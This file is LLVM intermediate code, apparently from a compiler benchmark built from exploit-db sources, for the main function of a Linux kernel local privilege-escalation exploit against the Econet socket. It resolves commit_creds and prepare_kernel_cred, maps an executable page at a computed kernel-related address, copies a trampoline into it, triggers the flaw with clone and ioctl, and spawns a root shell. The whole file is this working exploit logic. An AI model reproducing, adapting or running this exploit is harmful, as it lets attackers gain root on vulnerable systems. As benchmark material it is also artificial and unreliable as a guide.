; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/linux/local/extr_15704.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/linux/local/extr_15704.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

@PF_ECONET = common dso_local global i32 0, align 4
@SOCK_DGRAM = common dso_local global i32 0, align 4
@.str = private unnamed_addr constant [10 x i8] c"/dev/zero\00", align 1
@O_RDONLY = common dso_local global i32 0, align 4
@.str.1 = private unnamed_addr constant [38 x i8] c"[*] Failed to open file descriptors.\0A\00", align 1
@.str.2 = private unnamed_addr constant [35 x i8] c"[*] Resolving kernel addresses...\0A\00", align 1
@.str.3 = private unnamed_addr constant [13 x i8] c"econet_ioctl\00", align 1
@.str.4 = private unnamed_addr constant [11 x i8] c"econet_ops\00", align 1
@.str.5 = private unnamed_addr constant [13 x i8] c"commit_creds\00", align 1
@commit_creds = common dso_local global i64 0, align 8
@.str.6 = private unnamed_addr constant [20 x i8] c"prepare_kernel_cred\00", align 1
@prepare_kernel_cred = common dso_local global i64 0, align 8
@.str.7 = private unnamed_addr constant [39 x i8] c"[*] Failed to resolve kernel symbols.\0A\00", align 1
@.str.8 = private unnamed_addr constant [32 x i8] c"[*] Failed to allocate memory.\0A\00", align 1
@.str.9 = private unnamed_addr constant [27 x i8] c"[*] Calculating target...\0A\00", align 1
@OFFSET = common dso_local global i64 0, align 8
@SHIFT = common dso_local global i64 0, align 8
@PROT_READ = common dso_local global i32 0, align 4
@PROT_WRITE = common dso_local global i32 0, align 4
@PROT_EXEC = common dso_local global i32 0, align 4
@MAP_PRIVATE = common dso_local global i32 0, align 4
@MAP_ANONYMOUS = common dso_local global i32 0, align 4
@MAP_FIXED = common dso_local global i32 0, align 4
@.str.10 = private unnamed_addr constant [41 x i8] c"[*] Failed to mmap() at target address.\0A\00", align 1
@trampoline = common dso_local global i32 0, align 4
@trigger = common dso_local global i64 0, align 8
@CLONE_VM = common dso_local global i32 0, align 4
@CLONE_CHILD_CLEARTID = common dso_local global i32 0, align 4
@SIGCHLD = common dso_local global i32 0, align 4
@.str.11 = private unnamed_addr constant [27 x i8] c"[*] Triggering payload...\0A\00", align 1
@.str.12 = private unnamed_addr constant [33 x i8] c"[*] Exploit failed to get root.\0A\00", align 1
@.str.13 = private unnamed_addr constant [15 x i8] c"[*] Got root!\0A\00", align 1
@.str.14 = private unnamed_addr constant [8 x i8] c"/bin/sh\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main(i32 %0, i8** %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8**, align 8
  %6 = alloca i64, align 8
  %7 = alloca i64, align 8
  %8 = alloca i64, align 8
  %9 = alloca i64, align 8
  %10 = alloca [4 x i32], align 16
  %11 = alloca i32, align 4
  %12 = alloca i8*, align 8
  %13 = alloca i8*, align 8
  store i32 0, i32* %3, align 4
  store i32 %0, i32* %4, align 4
  store i8** %1, i8*** %5, align 8
  %14 = getelementptr inbounds [4 x i32], [4 x i32]* %10, i64 0, i64 0
  %15 = call i32 @pipe(i32* %14)
  %16 = load i32, i32* @PF_ECONET, align 4
  %17 = load i32, i32* @SOCK_DGRAM, align 4
  %18 = call i32 @socket(i32 %16, i32 %17, i32 0)
  %19 = getelementptr inbounds [4 x i32], [4 x i32]* %10, i64 0, i64 2
  store i32 %18, i32* %19, align 8
  %20 = load i32, i32* @O_RDONLY, align 4
  %21 = call i32 @open(i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str, i64 0, i64 0), i32 %20)
  %22 = getelementptr inbounds [4 x i32], [4 x i32]* %10, i64 0, i64 3
  store i32 %21, i32* %22, align 4
  %23 = getelementptr inbounds [4 x i32], [4 x i32]* %10, i64 0, i64 0
  %24 = load i32, i32* %23, align 16
  %25 = icmp slt i32 %24, 0
  br i1 %25, label %38, label %26

26:                                               ; preds = %2
  %27 = getelementptr inbounds [4 x i32], [4 x i32]* %10, i64 0, i64 1
  %28 = load i32, i32* %27, align 4
  %29 = icmp slt i32 %28, 0
  br i1 %29, label %38, label %30

30:                                               ; preds = %26
  %31 = getelementptr inbounds [4 x i32], [4 x i32]* %10, i64 0, i64 2
  %32 = load i32, i32* %31, align 8
  %33 = icmp slt i32 %32, 0
  br i1 %33, label %38, label %34

34:                                               ; preds = %30
  %35 = getelementptr inbounds [4 x i32], [4 x i32]* %10, i64 0, i64 3
  %36 = load i32, i32* %35, align 4
  %37 = icmp slt i32 %36, 0
  br i1 %37, label %38, label %40

38:                                               ; preds = %34, %30, %26, %2
  %39 = call i32 @printf(i8* getelementptr inbounds ([38 x i8], [38 x i8]* @.str.1, i64 0, i64 0))
  store i32 -1, i32* %3, align 4
  br label %124

40:                                               ; preds = %34
  %41 = call i32 @printf(i8* getelementptr inbounds ([35 x i8], [35 x i8]* @.str.2, i64 0, i64 0))
  %42 = call i64 @get_kernel_sym(i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.3, i64 0, i64 0))
  store i64 %42, i64* %7, align 8
  %43 = call i64 @get_kernel_sym(i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.4, i64 0, i64 0))
  store i64 %43, i64* %6, align 8
  %44 = call i64 @get_kernel_sym(i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.5, i64 0, i64 0))
  store i64 %44, i64* @commit_creds, align 8
  %45 = call i64 @get_kernel_sym(i8* getelementptr inbounds ([20 x i8], [20 x i8]* @.str.6, i64 0, i64 0))
  store i64 %45, i64* @prepare_kernel_cred, align 8
  %46 = load i64, i64* %7, align 8
  %47 = icmp ne i64 %46, 0
  br i1 %47, label %48, label %57

48:                                               ; preds = %40
  %49 = load i64, i64* @commit_creds, align 8
  %50 = icmp ne i64 %49, 0
  br i1 %50, label %51, label %57

51:                                               ; preds = %48
  %52 = load i64, i64* @prepare_kernel_cred, align 8
  %53 = icmp ne i64 %52, 0
  br i1 %53, label %54, label %57

54:                                               ; preds = %51
  %55 = load i64, i64* %6, align 8
  %56 = icmp ne i64 %55, 0
  br i1 %56, label %59, label %57

57:                                               ; preds = %54, %51, %48, %40
  %58 = call i32 @printf(i8* getelementptr inbounds ([39 x i8], [39 x i8]* @.str.7, i64 0, i64 0))
  store i32 -1, i32* %3, align 4
  br label %124

59:                                               ; preds = %54
  %60 = call i8* @malloc(i32 65536)
  store i8* %60, i8** %12, align 8
  %61 = icmp ne i8* %60, null
  br i1 %61, label %64, label %62

62:                                               ; preds = %59
  %63 = call i32 @printf(i8* getelementptr inbounds ([32 x i8], [32 x i8]* @.str.8, i64 0, i64 0))
  store i32 -1, i32* %3, align 4
  br label %124

64:                                               ; preds = %59
  %65 = call i32 @printf(i8* getelementptr inbounds ([27 x i8], [27 x i8]* @.str.9, i64 0, i64 0))
  %66 = load i64, i64* %6, align 8
  %67 = add i64 %66, 80
  %68 = load i64, i64* @OFFSET, align 8
  %69 = sub i64 %67, %68
  store i64 %69, i64* %8, align 8
  %70 = load i64, i64* %7, align 8
  %71 = load i64, i64* @SHIFT, align 8
  %72 = shl i64 %70, %71
  %73 = load i64, i64* @SHIFT, align 8
  %74 = lshr i64 %72, %73
  store i64 %74, i64* %9, align 8
  %75 = load i64, i64* %9, align 8
  %76 = and i64 %75, -4096
  %77 = inttoptr i64 %76 to i8*
  %78 = load i32, i32* @PROT_READ, align 4
  %79 = load i32, i32* @PROT_WRITE, align 4
  %80 = or i32 %78, %79
  %81 = load i32, i32* @PROT_EXEC, align 4
  %82 = or i32 %80, %81
  %83 = load i32, i32* @MAP_PRIVATE, align 4
  %84 = load i32, i32* @MAP_ANONYMOUS, align 4
  %85 = or i32 %83, %84
  %86 = load i32, i32* @MAP_FIXED, align 4
  %87 = or i32 %85, %86
  %88 = call i8* @mmap(i8* %77, i32 8192, i32 %82, i32 %87, i32 0, i32 0)
  store i8* %88, i8** %13, align 8
  %89 = load i8*, i8** %13, align 8
  %90 = ptrtoint i8* %89 to i64
  %91 = icmp eq i64 %90, -1
  br i1 %91, label %92, label %94

92:                                               ; preds = %64
  %93 = call i32 @printf(i8* getelementptr inbounds ([41 x i8], [41 x i8]* @.str.10, i64 0, i64 0))
  store i32 -1, i32* %3, align 4
  br label %124

94:                                               ; preds = %64
  %95 = load i64, i64* %9, align 8
  %96 = inttoptr i64 %95 to i8*
  %97 = call i32 @memcpy(i8* %96, i32* @trampoline, i32 1024)
  %98 = load i64, i64* @trigger, align 8
  %99 = inttoptr i64 %98 to i32 (i8*)*
  %100 = load i8*, i8** %12, align 8
  %101 = ptrtoint i8* %100 to i64
  %102 = add i64 %101, 65536
  %103 = inttoptr i64 %102 to i8*
  %104 = load i32, i32* @CLONE_VM, align 4
  %105 = load i32, i32* @CLONE_CHILD_CLEARTID, align 4
  %106 = or i32 %104, %105
  %107 = load i32, i32* @SIGCHLD, align 4
  %108 = or i32 %106, %107
  %109 = bitcast [4 x i32]* %10 to i32**
  %110 = load i64, i64* %8, align 8
  %111 = call i32 @clone(i32 (i8*)* %99, i8* %103, i32 %108, i32** %109, i32* null, i32* null, i64 %110)
  %112 = call i32 @sleep(i32 1)
  %113 = call i32 @printf(i8* getelementptr inbounds ([27 x i8], [27 x i8]* @.str.11, i64 0, i64 0))
  %114 = getelementptr inbounds [4 x i32], [4 x i32]* %10, i64 0, i64 2
  %115 = load i32, i32* %114, align 8
  %116 = call i32 @ioctl(i32 %115, i32 0, i32* null)
  %117 = call i64 (...) @getuid()
  %118 = icmp ne i64 %117, 0
  br i1 %118, label %119, label %121

119:                                              ; preds = %94
  %120 = call i32 @printf(i8* getelementptr inbounds ([33 x i8], [33 x i8]* @.str.12, i64 0, i64 0))
  store i32 -1, i32* %3, align 4
  br label %124

121:                                              ; preds = %94
  %122 = call i32 @printf(i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.13, i64 0, i64 0))
  %123 = call i32 @execl(i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.14, i64 0, i64 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.14, i64 0, i64 0), i32* null)
  br label %124

124:                                              ; preds = %121, %119, %92, %62, %57, %38
  %125 = load i32, i32* %3, align 4
  ret i32 %125
}

declare dso_local i32 @pipe(i32*) #1

declare dso_local i32 @socket(i32, i32, i32) #1

declare dso_local i32 @open(i8*, i32) #1

declare dso_local i32 @printf(i8*) #1

declare dso_local i64 @get_kernel_sym(i8*) #1

declare dso_local i8* @malloc(i32) #1

declare dso_local i8* @mmap(i8*, i32, i32, i32, i32, i32) #1

declare dso_local i32 @memcpy(i8*, i32*, i32) #1

declare dso_local i32 @clone(i32 (i8*)*, i8*, i32, i32**, i32*, i32*, i64) #1

declare dso_local i32 @sleep(i32) #1

declare dso_local i32 @ioctl(i32, i32, i32*) #1

declare dso_local i64 @getuid(...) #1

declare dso_local i32 @execl(i8*, i8*, i32*) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
